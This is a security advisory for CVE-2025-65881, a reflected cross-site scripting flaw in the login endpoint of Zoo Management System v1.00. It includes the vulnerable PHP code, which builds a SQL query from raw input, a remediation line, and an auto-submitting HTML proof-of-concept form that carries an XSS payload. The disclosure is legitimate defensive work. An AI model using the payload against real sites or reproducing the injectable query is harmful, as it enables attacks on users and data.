

# CVE-2025-65881
The Project `Zoo Management System v1.00` is vulnerable to Cross-site scripting (XSS) on `/zms/classes/Login.php?f=login` due to:

1. Invalid `Content-type` of JSON Responses on `/zms/classes/Login.php?f=login`
2. Unsanitized User Input in Responses

Allowing unauthenticated attackers to inject malicious HTML/JS that executes in victim's browsers.

# Affected File & Vulnerable Code

`/zms/classes/Login.php`

```php
return json_encode(array(
    'status' => 'incorrect',
    'last_qry' => "SELECT * from users where username = '$username' and password = md5('$password') "
));
```

## Root Cause

1. The endpoint does **not** set the content type to application/json.
2. `$username` parameter is not sanitized when used in SQL queries or when reflected in the response, This same flaw previously resulted in a SQL Injection vulnerability (CVE-2025-7160)

# Remediation

Add this line on the function `login()`:
```php
public function login(){
		header('Content-Type: application/json; charset=utf-8');
		extract($_POST);
```
![header](https://raw.githubusercontent.com/MMAKINGDOM/1/refs/heads/main/test.png)

# Proof of Concept

```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="http://localhost/zms/classes/Login.php?f=login" method="post">
      <input type="hidden" name="username" value="awdawdawdawdawaaaa$<img src=x onerror=alert`HACKED`>" />
    <input type="hidden" name="password" value="awdawda" />
          <input type="submit" value="Submit request" />
      </form>
      <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>
  </body>
  </html>
  ```
  
  ![XSS](https://raw.githubusercontent.com/MMAKINGDOM/1/refs/heads/main/security_2592258.png)
  
  # References 
  
  Source code can be downloaded for free here:
  
  https://www.sourcecodester.com/php/15344/zoo-management-system-phpoop-free-source-code.html
  
  
  # Credit
  
  Muntadhar M. Ahmed ([almuntadhar0x01](https://almuntadhar0x01.me/))
  
